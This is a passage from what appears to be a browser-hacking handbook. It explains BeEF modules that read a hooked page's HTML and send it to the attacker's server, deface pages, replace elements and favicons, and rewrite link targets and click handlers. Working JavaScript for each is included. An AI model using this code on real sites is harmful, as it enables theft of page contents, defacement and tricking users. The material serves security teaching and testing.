
One of the easiest, and often overlooked, methods of tricking a user into performing untoward actions is simply by rewriting the content within the current hooked page. If you’re able to execute JavaScript within an origin, there’s nothing stopping you from acquiring portions of the current document, or from inserting arbitrary content. This can lead to very subtle and effective methods of tricking the user into performing an action on your behalf.

These techniques of changing discrete pieces of the DOM are essential to a majority of the following attacks. In fact, a number of these methods have been discussed already in earlier chapters on initiating and retaining control of the browser.

So, where to begin? To first know what to rewrite, you need to know what’s in the current document to begin with. As long as your hook is within the context of a document, this is as simple as retrieving the value of the document.body element. If the current document has a <body> tag, this will be everything within that tag.

The innerHTML property of any HTML element can be queried to produce the syntax of itself and all its child elements. The “Get Page HTML” BeEF module does exactly this:

```
  try {
    var html_head = document.head.innerHTML.toString();
  } catch (e) {
    var html_head = "Error: document has no head";
  }
  try {
    var html_body = document.body.innerHTML.toString();
  } catch (e) {
    var html_body = "Error: document has no body";
  }

  beef.net.send("<%= @command_url %>", <%= @command_id %>,
    'head='+html_head+'&body='+html_body);
```

The html_head and html_body variables are populated with the HTML contents of the document’s header and body. The toString() method is used to explicitly convert them to strings, and finally, the beef.net.send() method is called to submit the results back to the BeEF server.

 start feature 

* * *

**How BeEF’s net.send Works** Retaining control was discussed extensively in Chapter 3, but underneath BeEF’s hood lies a lot of interesting code that simplifies how command modules are able to send data back into the framework. The beef.net.send() method is a perfect example of this. To try to provide a reliable method for command modules to submit data back to the BeEF server, the beef.net.send() method and associated data handler on the server-side were constructed. You’ll notice in the earlier call to beef.net.send() that it includes three parameters—@command_url, @command_id, and then a string value—in the earlier instance: ‘head=’+html_head+’&body=’+html_body. When BeEF processes the command module just prior to submitting it to the victim’s browser, it replaces the @command_url and @command_id fields with references back to the URL of the current command, and its unique ID. When beef.net.send() submits those values back, the BeEF server is able to collate which unique command module the response is destined for. This allows the attacker to submit multiple command modules concurrently and keep the responses synchronized with their corresponding requests. The code executes in the following steps: Level1 **1.** The beef.net.send() method adds arbitrary data from command modules or other BeEF libraries onto a JavaScript array. **2.** The BeEF poller executes the beef.net.flush() method that: /Level1 

*   Converts the array objects into JSON notation.1

*   Base64-encodes the JSON variable.

*   Breaks the base64 data into chunks of a determined length.

*   Streams the packets back to the BeEF server using various asynchronous GET requests, with associated sequence identifiers.

Level1 **3.** The BeEF server collects all the responses, reconstructing the original data and reassembling the chunks. /Level1 You can view all of the beef.net.send code at [https://browserhacker.com](https://browserhacker.com) or at the Wiley website at: [www.wiley.com/go/browserhackershandbook.](http://www.wiley.com/go/browserhackershandbook.) 

* * *

 end feature 

Suppose the body of the hooked page contains the following:

```
<div id="header">This is the title of my page</div>
<div id="content">This is where most of the content of my page rests.
  And this page has lots of interesting content</div>
```

You can manipulate the header element without influencing the other content by executing the following JavaScript:

```
document.getElementById('header').innerHTML = "Evil Defaced Header";
```

jQuery simplifies this by leveraging the power of selectors. To perform the same defacement with jQuery as provided within BeEF, you would simply execute:

```
$j('#header').html('Evil Defaced Header');
```

BeEF includes a simple module to deface standard elements of a hooked page, namely the HTML body, title, and icon. The “Replace Content (Deface)” module takes no precautions in overwriting the existing content. Take care when executing this module because it will be very obvious to your target. The module performs the three following functions:

```
document.body.innerHTML = "<%= @deface_content %>";
document.title = "<%= @deface_title %>";
beef.browser.changeFavicon("<%= @deface_favicon %>");
```

The first function replaces the document.body element’s HTML content with dynamic content from the user, submitted via the @deface_content variable. Bear in mind that <script> elements added through @deface_content are not automatically handled and added to the head of the document. You might want to use defer2 or similar attributes to adjust the timing of script execution.

The Erubis library in Ruby is used to perform the dynamic binding that replaces the actual value before the module is sent to the hooked browser. The second function does the same, but rewrites the document.title attribute. Finally, the icon of the page is updated by using BeEF’s changeFavicon() method. This method modifies the document.head element by removing any existing icon elements and inserting a new one. For example:

```
<link id="dynamic-favicon" rel="shortcut icon"
href="http://browserhacker.com/favicon.ico">
```

If the brutish nature of this defacement isn’t subtle enough for you, the “Replace Component (Deface)” module may suit your requirements better. Instead of replacing the entire document.body, this module allows granular DOM element selection and replacement. The code for this module is similar to the earlier jQuery example of rewriting a specific element:

```
var result = $j('<%= @deface_selector %>').each(function() {
    $j(this).html('<%= @deface_content %>');
  }).length;

beef.net.send("<%= @command_url %>", <%= @command_id %>,
  "result=Defaced " + result +" elements");
```

Using jQuery’s selectors,3 a single command can be used to replace a single DOM element or a collection of DOM elements. The preceding code takes the @deface_selector variable, then iterates over each of these replacing the inner HTML content with the @deface_content variable. The number of modified elements is finally returned back to the BeEF server.

In addition to these methods of defacing content, BeEF also includes a number of other modules to automate the process of rewriting content within the DOM:

*   Replace HREFs—Similar to the “Replace Component” module, this module iterates anchor through elements replacing the HREF attribute.

*   Replace HREF (Click Events)—This module is similar to the “Replace HREFs” module, but only rewrites the onClick event handling and not the actual HREF. This is similar to the Man-in-the-Browser techniques discussed in the “Using Man-in-the-Browser Attacks” section of Chapter 3. If the <a> element already contains an onClick attribute, this method will simply override the existing content. Depending on your needs, you might want to change this default behavior in order to support stacking of multiple actions triggered with a single onClick.
